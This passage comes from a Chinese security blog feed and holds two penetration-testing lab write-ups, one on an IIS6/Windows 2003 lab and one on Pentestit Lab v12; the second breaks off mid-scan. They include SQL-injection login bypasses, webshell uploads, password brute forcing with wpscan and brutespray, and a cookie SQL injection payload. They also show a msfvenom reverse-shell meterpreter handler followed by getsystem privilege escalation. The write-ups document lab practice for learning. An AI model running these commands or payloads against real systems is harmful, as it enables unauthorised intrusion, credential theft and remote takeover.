DNS_Domain_Name: iis6cn</span><br><span class="line">|   DNS_Computer_Name: iis6cn</span><br><span class="line">|_  Product_Version: 5.2.3790</span><br><span class="line">| http-robots.txt: 11 disallowed entries</span><br><span class="line">| /Admin/ /App_Data/ /App_Themes/ /bin/ /Images/</span><br><span class="line">|_/Install/ /Skin/ /Temp/ /Template/ /Print.aspx /Web.config</span><br><span class="line">|_http-server-header: Microsoft-IIS/6.0</span><br><span class="line">| http-title: \xE7\xBD\x91\xE7\xAB\x99\xE9\xA6\x96\xE9\xA1\xB5-\xE5\x8A\xA8\xE6\x98\x93\xE7\xBD\x91\xE7\xBB\x9C</span><br><span class="line">|_Requested resource was http://192.168.3.5:82/(S(0re5syy1ktjgm145wqtzvp55))/Default.aspx</span><br><span class="line">| http-webdav-scan:</span><br><span class="line">|   WebDAV type: Unknown</span><br><span class="line">|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK</span><br><span class="line">|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH</span><br><span class="line">|   Server Type: Microsoft-IIS/6.0</span><br><span class="line">|_  Server Date: Tue, 17 Sep 2019 06:37:00 GMT</span><br><span class="line">83/tcp   open  http          Microsoft IIS httpd 6.0</span><br><span class="line">| http-cookie-flags:</span><br><span class="line">|   /:</span><br><span class="line">|     ASPSESSIONIDCCSBTCQS:</span><br><span class="line">|_      httponly flag not set</span><br><span class="line">| http-methods:</span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH</span><br><span class="line">|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH</span><br><span class="line">|_http-server-header: Microsoft-IIS/6.0</span><br><span class="line">|_http-title: ASP\xCC\xBD\xD5\xEBV1.93\xA3\xAD\xB0\xA2\xBD\xADhttp://www.ajiang.net</span><br><span class="line">| http-webdav-scan:</span><br><span class="line">|   WebDAV type: Unknown</span><br><span class="line">|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK</span><br><span class="line">|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH</span><br><span class="line">|   Server Type: Microsoft-IIS/6.0</span><br><span class="line">|_  Server Date: Tue, 17 Sep 2019 06:36:59 GMT</span><br><span class="line">84/tcp   open  http          Microsoft IIS httpd 6.0</span><br><span class="line">| http-methods:</span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH</span><br><span class="line">|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH</span><br><span class="line">|_http-server-header: Microsoft-IIS/6.0</span><br><span class="line">|_http-title: phpinfo()</span><br><span class="line">| http-webdav-scan:</span><br><span class="line">|   WebDAV type: Unknown</span><br><span class="line">|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK</span><br><span class="line">|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH</span><br><span class="line">|   Server Type: Microsoft-IIS/6.0</span><br><span class="line">|_  Server Date: Tue, 17 Sep 2019 06:37:00 GMT</span><br><span class="line">85/tcp   open  http          Microsoft IIS httpd 6.0</span><br><span class="line">| http-cookie-flags:</span><br><span class="line">|   /:</span><br><span class="line">|     PHPSESSID:</span><br><span class="line">|_      httponly flag not set</span><br><span class="line">| http-methods:</span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH</span><br><span class="line">|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH</span><br><span class="line">| http-robots.txt: 5 disallowed entries</span><br><span class="line">|_/ /admin/ /documents/ /images/ /passwords/</span><br><span class="line">|_http-server-header: Microsoft-IIS/6.0</span><br><span class="line">| http-title: bWAPP - Login</span><br><span class="line">|_Requested resource was login.php</span><br><span class="line">| http-webdav-scan:</span><br><span class="line">|   WebDAV type: Unknown</span><br><span class="line">|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK</span><br><span class="line">|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH</span><br><span class="line">|   Server Type: Microsoft-IIS/6.0</span><br><span class="line">|_  Server Date: Tue, 17 Sep 2019 06:36:59 GMT</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds  Windows Server 2003 R2 3790 Service Pack 2 microsoft-ds</span><br><span class="line">1028/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">1433/tcp open  ms-sql-s      Microsoft SQL Server 2008 10.00.1600.00; RTM</span><br><span class="line">| ms-sql-ntlm-info:</span><br><span class="line">|_  Product_Version: 5.2.3790</span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Issuer: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 1024</span><br><span class="line">| Signature Algorithm: sha1WithRSAEncryption</span><br><span class="line">| Not valid before: 2019-09-17T03:37:13</span><br><span class="line">| Not valid after:  2049-09-17T03:37:13</span><br><span class="line">| MD5:   7ab5 0f37 b867 a9ec 3304 cad9 bf7f 878f</span><br><span class="line">|_SHA-1: 328c c184 6562 b4d9 ed78 6599 5dee e4a9 e77f 2309</span><br><span class="line">|_ssl-date: 2019-09-17T06:37:50+00:00; -1s from scanner time.</span><br><span class="line">1801/tcp open  msmq?</span><br><span class="line">2103/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">2105/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">2107/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">3306/tcp open  mysql?</span><br><span class="line">|_mysql-info: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">3389/tcp open  ms-wbt-server Microsoft Terminal Service</span><br><span class="line">8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">|_http-favicon: Apache Tomcat</span><br><span class="line">| http-methods:</span><br><span class="line">|   Supported Methods: GET HEAD POST PUT DELETE TRACE OPTIONS</span><br><span class="line">|_  Potentially risky methods: PUT DELETE TRACE</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-server-header: Apache-Coyote/1.1</span><br><span class="line">|_http-title: Apache Tomcat</span><br></pre></td></tr></table></figure></details></p><p></p><h3 id="23端口"><a href="#23端口" class="headerlink" title="23端口"></a>23端口</h3><p>暂无信息</p><h3 id="81端口-Fyblogs系统"><a href="#81端口-Fyblogs系统" class="headerlink" title="81端口 Fyblogs系统"></a>81端口 Fyblogs系统</h3><p>开着一个Fyblogs新闻文章系统,随便瞎点，诶感觉有东西<br><img src="https://i.loli.net/2019/09/17/orFEeIjXLbDBMdu.png" alt="1.png"><br>绕了半天waf（太菜）无果<br>发现一个<a href="http://192.168.3.5:81/admin/index.asp" target="_blank" rel="noopener">登陆后台</a>，<code>admin:admin</code>登陆进去了，验证码也没有作用<br><img src="https://i.loli.net/2019/09/17/7bSw1ameirs4qdR.png" alt="2.png"><br>再次测试发现登陆框存在万能密码<code>&#39;or&#39;=&#39;or&#39;</code>,百度了一下发现还有<a href="http://192.168.3.5:81/admin/uploadfile.asp?currentFolder=/upfiles/../" target="_blank" rel="noopener">目录遍历</a>问题不大。<br>通过目录遍历发现<code>kindeditor</code>编辑器和版本<code>3.5.1</code><br><img src="https://i.loli.net/2019/09/19/zJZeHYPG9lyh1xi.png" alt="3.png"><br>通过修改<code>fileHZ</code>参数<code>.jpg</code>可以将jpg改为我们的asp马儿<br><img src="https://i.loli.net/2019/09/19/Ng5RBpzt2nbU1jX.png" alt="4.png"><br><img src="https://i.loli.net/2019/09/19/DJOmaH7kFIs5ozf.png" alt="5.png"><br>上蚁剑<br><img src="https://i.loli.net/2019/09/19/4iRjQbDEfr8s2zg.png" alt="6.png"><br>权限太小了，无法执行命令。<br>换一下个目标</p><h3 id="82端口-动易网络"><a href="#82端口-动易网络" class="headerlink" title="82端口 动易网络"></a>82端口 动易网络</h3><p>开着一个动易cms 3.5<br><img src="https://i.loli.net/2019/09/19/1lZKaRovi37PzMN.png" alt="7.png"><br>在网页底部发现管理登录入口<br><img src="https://i.loli.net/2019/09/19/TCtHWYNkS5ipeuz.png" alt="8.png"><br>通过百度知道默认账号<code>admin</code>,密码未知<br><img src="https://i.loli.net/2019/09/19/QGHuwkVDBtXzhrJ.png" alt="9.png"><br>猜测管理认证密码<code>8888</code>,枚举密码<br><img src="https://i.loli.net/2019/09/19/WB6sI8RU7YnGNhe.png" alt="10.png"><br><img src="https://i.loli.net/2019/09/19/4gZDVG1Wrw6idAt.png" alt="12.png"><br>在后台上传aspx马儿<br><img src="https://i.loli.net/2019/09/19/2MlNBoULzZ8uFbK.png" alt="11.png"><br>权限更小，只能看，连接不上</p><h3 id="83-asp探针"><a href="#83-asp探针" class="headerlink" title="83 asp探针"></a>83 asp探针</h3><p>看见一个asp探针<br><img src="https://i.loli.net/2019/09/20/eUkOgSyApWbHNCi.png" alt="13.png"><br>3389登录试试<br><img src="https://i.loli.net/2019/09/20/oTrKQBMgy29XGtY.png" alt="14.png"><br><code>administrator:admin</code>,登录进去了。0.0</p><h3 id="87端口-wordpress3-1-4"><a href="#87端口-wordpress3-1-4" class="headerlink" title="87端口  wordpress3.1.4"></a>87端口  wordpress3.1.4</h3><p><img src="https://i.loli.net/2019/09/20/nET7eIMl5vSq1di.png" alt="15.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# wpscan --url http://192.168.3.5:87 --enumerate u</span><br><span class="line">[+] admin</span><br></pre></td></tr></table></figure></p><p>枚举一波<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# wpscan --url http://192.168.3.5:87 -U admin -P /usr/share/seclists/Passwords/cirt-default-passwords.txt</span><br><span class="line">| Username: admin, Password: ADMIN</span><br></pre></td></tr></table></figure></p><p>后台可以直接写马儿<br><img src="https://i.loli.net/2019/09/20/ptYWUxP37QfJzBS.png" alt="16.png"><br>写入404文件中，蚁剑连接,上传后门<br><img src="https://i.loli.net/2019/09/20/ONari8YVsykwJXT.png" alt="17.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>执行一下后门<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.3.10 lport=4444 -f exe -o test.exe</span><br><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set LHOST 192.168.3.10</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure></p><p>简单提权<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getsystem </span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin))</span><br><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure></p><h1 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h1><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;靶机：IIS 6.X + MSSQL 2008 + php 5.2.17 [ 以iis服务权限运行 ] + mysql 5.1.x&lt;br&gt;本机：kali 2019&lt;br&gt;感谢@klion提供环境&lt;br&gt;深刻感受到靶机与实战的区别&lt;br&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://www.lanbainan.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全测试" scheme="http://www.lanbainan.cn/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    
      <category term="Windows" scheme="http://www.lanbainan.cn/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>对Pentestit Lab v12的测试</title>
    <link href="http://www.lanbainan.cn/2019/08/11/2019-08-11/"/>
    <id>http://www.lanbainan.cn/2019/08/11/2019-08-11/</id>
    <published>2019-08-10T23:04:00.000Z</published>
    <updated>2019-09-29T04:27:25.805Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Pentestit-Lab-v12"><a href="#Pentestit-Lab-v12" class="headerlink" title="Pentestit Lab v12"></a>Pentestit Lab v12</h1><p>连接方式：外国主机+openvpn（ss+openvpn是难受的）<br>实验目的：获取12个flag<br>项目地址：<a href="https://lab.pentestit.ru" target="_blank" rel="noopener">https://lab.pentestit.ru</a><br><a id="more"></a><br><img src="https://i.loli.net/2019/08/10/638I7lQaKdArZy2.png" alt="1.png"><br>登录完成<br><code>192.168.101.12</code> and <code>192.168.101.13</code><br>官方给的两个网关</p><h1 id="192-168-101-13内网"><a href="#192-168-101-13内网" class="headerlink" title="192.168.101.13内网"></a>192.168.101.13内网</h1><p>nmap开路<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@cloud ~]# nmap -T4 -A -v -p- 192.168.101.12</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">25/tcp   open  smtp    Postfix smtpd</span><br><span class="line">|_smtp-commands: SMTP: EHLO 521 5.5.1 Protocol error</span><br><span class="line">80/tcp   open  http    nginx 1.16.0</span><br><span class="line">|_http-methods: No Allow or Public header in OPTIONS response (status code 403)</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">143/tcp  open  imap    Dovecot imapd</span><br><span class="line">|_imap-capabilities: more ENABLE have AUTH=PLAIN IDLE IMAP4rev1 SASL-IR Pre-login listed AUTH=LOGINA0001 post-login LITERAL+ LOGIN-REFERRALS capabilities OK ID</span><br><span class="line">8080/tcp open  http    nginx</span><br><span class="line">|_http-methods: No Allow or Public header in OPTIONS response (status code 301)</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">| http-title: Roundcube Webmail :: Welcome to Roundcube Webmail</span><br><span class="line">|_Requested resource was http://192.168.101.12:8080/mail/</span><br></pre></td></tr></table></figure></p><p>将结果保存为<code>nmap12.xml</code><br>修改hosts<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@hostker:~# vim /etc/hosts</span><br><span class="line">192.168.101.12 site.test.lab</span><br><span class="line">root@hostker:~# elinks http://site.test.lab</span><br></pre></td></tr></table></figure></p><h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p><img src="https://i.loli.net/2019/08/11/zfytHaJYRBogce5.png" alt="2.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# curl -i http://site.test.lab</span><br><span class="line">&lt;meta name=&quot;generator&quot; content=&quot;WordPress 4.9.8&quot; /&gt;</span><br></pre></td></tr></table></figure></p><p>现在信息：<br>e-mail: <a href="mailto:info@test.lab" target="_blank" rel="noopener">info@test.lab</a><br>版本：<code>WordPress 4.9.8</code></p><h2 id="8080端口"><a href="#8080端口" class="headerlink" title="8080端口"></a>8080端口</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@hostker:~# elinks http://site.test.lab:8080</span><br></pre></td></tr></table></figure><p><code>Webmail</code>服务<br><img src="https://i.loli.net/2019/08/11/Vr2YvdsJu3QBAxi.png" alt="3.png"></p><h2 id="25端口"><a href="#25端口" class="headerlink" title="25端口"></a>25端口</h2><p>开着SMTP服务器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# telnet 192.168.101.12 25</span><br><span class="line">Trying 192.168.101.12...</span><br><span class="line">Connected to 192.168.101.12.</span><br><span class="line">Escape character is &apos;^]&apos;.</span><br><span class="line">220 mail.test.lab ESMTP Postfix</span><br><span class="line">helo test.lab</span><br><span class="line">250 mail.test.lab</span><br></pre></td></tr></table></figure></p><p>成功连接</p><h2 id="143端口"><a href="#143端口" class="headerlink" title="143端口"></a>143端口</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# telnet 192.168.101.12 143</span><br><span class="line">Trying 192.168.101.12...</span><br><span class="line">Connected to 192.168.101.12.</span><br><span class="line">Escape character is &apos;^]&apos;.</span><br><span class="line">* OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE AUTH=PLAIN AUTH=LOGIN] Dovecot ready.</span><br></pre></td></tr></table></figure><p>可以登录</p><h2 id="开始测试"><a href="#开始测试" class="headerlink" title="开始测试"></a>开始测试</h2><p> 爆破143端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# brutespray -f Desktop/nmap12.xml -u info@test.lab -s imap</span><br><span class="line">ACCOUNT CHECK: [imap] Host: 192.168.101.12 (1 of 1, 0 complete) User: info@test.lab (1 of 1, 0 complete) Password: 123456789 (1 of 100 complete)ACCOUNT FOUND: [imap] Host: 192.168.101.12 User: info@test.lab Password: 123456789 [SUCCESS]</span><br></pre></td></tr></table></figure></p><p>拥有一个账号<a href="mailto:info@test.lab" target="_blank" rel="noopener">info@test.lab</a>:<code>123456789</code><br>登录8080<br><img src="https://i.loli.net/2019/08/11/z5uPi7WRsHwB1Xp.png" alt="4.png"><br>吐槽啊!远程主机是命令行形式，没有找到支持JavaScript的文本浏览器，还是得靠本地主机</p><h3 id="openvpn-1"><a href="#openvpn-1" class="headerlink" title="openvpn-1"></a>openvpn-1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/lv12# cat open.conf</span><br><span class="line">client</span><br><span class="line">dev tun</span><br><span class="line">proto udp</span><br><span class="line">remote 192.168.101.13 1194</span><br><span class="line">auth-user-pass</span><br><span class="line">resolv-retry infinite</span><br><span class="line">persist-key</span><br><span class="line">persist-tun</span><br><span class="line">comp-lzo</span><br><span class="line">verb 3</span><br><span class="line">**********</span><br><span class="line">-----END CERTIFICATE-----</span><br><span class="line">&lt;/ca&gt;</span><br></pre></td></tr></table></figure><p>确定是<code>openvpn</code> 配置<br>注意信息收集每一步<br><img src="https://i.loli.net/2019/08/11/QnXqt2DvSEfIxj4.png" alt="5.png"><br>尝试连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/lv12# openvpn --config open.conf</span><br><span class="line">Enter Auth Username: info@test.lab</span><br><span class="line">Enter Auth Password: *********</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/08/11/mN379gJhXOYqRM4.png" alt="6.png"></p><h3 id="主机测试"><a href="#主机测试" class="headerlink" title="主机测试"></a>主机测试</h3><p>确定局域网存在哪些主机<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -sn 172.16.0.0/16</span><br><span class="line">Nmap scan report for 172.16.0.1</span><br><span class="line">Host is up (0.37s latency).</span><br><span class="line">Nmap scan report for 172.16.0.10</span><br><span class="line">Host is up (0.36s latency).</span><br><span class="line">Nmap scan report for 172.16.0.17</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line">Nmap scan report for 172.16.2.1</span><br></pre></td></tr></table></figure></p><p>排除俩网关<br><strong>172.16.0.10</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -sC -sV 172.16.0.10</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    nginx 1.16.0</span><br></pre></td></tr></table></figure></p><p>80端口还是那个站<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# wpscan --url site.test.lab -e u --random-user-agent</span><br></pre></td></tr></table></figure></p><p>还有WAF，使用随机User-Agent<br><img src="https://i.loli.net/2019/08/11/f8DNuUqW5r9FOcA.png" alt="7.png"><br>确定用户<code>admin</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# wpscan --url site.test.lab -e p --random-user-agent</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/08/11/1RCoPUyYD2356ug.png" alt="8.png"><br>确定插件<code>wp-survey-and-poll</code>版本<code>Version: 1.5.7.8</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# searchsploit &apos;wordpress Survey&apos;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/08/11/GKoZ2Vq8gbApXOc.png" alt="9.png"><br>根据poc得知COOKIE可注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wp_sap=[&quot;1650149780&apos;)) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,@@version,11#&quot;]</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/08/11/TzBPJwquUhYoWiC.png" alt="10.png"><br>好吧！WAF<br><strong>172.16.0.17</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -sC -sV 172.16.0.17</span><br><span class="line">Not shown: 861 closed ports, 123 filtered ports</span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">22/tcp   open  tcpwrapped</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 52:41:88:d7:94:bb:9d:1d:db:fa:ed:ed:eb:ad:d2:15 (RSA)</span><br><span class="line">|_  256 72:92:c7:db:12:3c:16:ca:60:f8:48:ac:05:76:83:7d (ED25519)</span><br><span class="line">25/tcp open  smtp    Postfix smtpd</span><br><span class="line">|_smtp-commands: SMTP: EHLO 521 5.5.1 Protocol error\x0D</span><br><span class="line">53/tcp   open     domain       ISC BIND 9.10.3-P4 (Debian Linux)</span><br><span class="line">| dns-nsid:</span><br><span class="line">|_  bind.version: 9.10.3-P4-Debian</span><br><span class="line">80/tcp   open     http         nginx 1.16.0</span><br><span class="line">|_http-server-header: nginx/1.16.0</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">88/tcp   open     kerberos-sec Heimdal Kerberos (server time: 2019-08-11 12:03:12Z)</span><br><span class="line">135/tcp  open     msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp  open     netbios-ssn  Samba smbd 3.X - 4.X (workgroup: TEST)</span><br><span class="line">389/tcp  open     ldap         (Anonymous bind OK)</span><br><span class="line">| ssl-cert: Subject: commonName=AD.test.lab/organizationName=Samba Administration</span><br><span class="line">| Not valid before: 2018-12-10T10:42:08</span><br><span class="line">|_Not valid after:  2020-11-09T10:42:08</span><br><span class="line">|_ssl-date: 2019-08-11T12:03:27+00:00; -55s from scanner time.</span><br><span class="line">445/tcp  open     netbios-ssn  Samba smbd 4.5.12-Debian (workgroup: TEST)</span><br><span class="line">464/tcp  open     kpasswd5?</span><br><span class="line">636/tcp  open     ssl/ldap     (Anonymous bind OK)</span><br><span class="line">| ssl-cert: Subject: commonName=AD.test.lab/organizationName=Samba Administration</span><br><span class="line">| Not valid before: 2018-12-10T10:42:08</span><br><span class="line">|_Not valid after:  2020-11-09T10:42:08</span><br><span class="line">|_ssl-date: 2019-08-11T12:07:21+00:00; +3m00s from scanner time.</span><br><span class="line">1024/tcp open     msrpc        Microsoft Windows RPC</span><br><span class="line">3268/tcp open     ldap         (Anonymous bind OK)</span><br><span class="line">| ssl-cert: Subject: commonName=AD.test.lab/organizationName=Samba Administration</span><br><span class="line">| Not valid before: 2018-12-10T10:42:08</span><br><span class="line">|_Not valid after:  2020-11-09T10:42:08</span><br><span class="line">|_ssl-date: 2019-08-11T12:04:22+00:00; -1s from scanner time.</span><br><span class="line">3269/tcp open     ssl/ldap     (Anonymous bind OK)</span><br><span class="line">| ssl-cert: Subject: commonName=AD.test.lab/organizationName=Samba Administration</span><br><span class="line">| Not valid before: 2018-12-10T10:42:08</span><br><span class="line">|_Not valid after:  2020-11-09T10:42:08</span><br><span class="line">|_ssl-date: 2019-08-11T12:04:12+00:00; -10s from scanner time.</span><br><span class="line">8080/tcp filtered http-proxy</span><br></pre></td></tr></table></figure></p><p>开启53端口，查询DNS记录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# dnsrecon -d test.lab -n 172.16.0.17 -a</span><br><span class="line"> [*]        ns1.test.lab 172.16.0.17</span><br><span class="line"> [*]        ns2.test.lab 172.16.2.10</span><br><span class="line"> [*]        @.test.lab 172.16.0.17</span><br><span class="line"> [*]        db.test.lab 172.16.0.30</span><br><span class="line"> [*]        dc.test.lab 172.16.0.17</span><br><span class="line"> [*]        helpdesk.test.lab 172.16.0.10</span><br><span class="line"> [*]        ns2.test.lab 172.16.2.10</span><br><span class="line"> [*]        my.test.lab 172.16.0.10</span><br><span class="line"> [*]        ad.test.lab 172.16.0.17</span><br><span class="line"> [*]        site.test.lab 172.16.0.10</span><br><span class="line"> [*]        gc._msdcs.test.lab 172.16.0.17</span><br><span class="line"> [*]        dns.test.lab 172.16.0.17</span><br><span class="line"> [*]        A dns.test.lab 172.16.2.10</span><br><span class="line"> [*]        ns1.test.lab 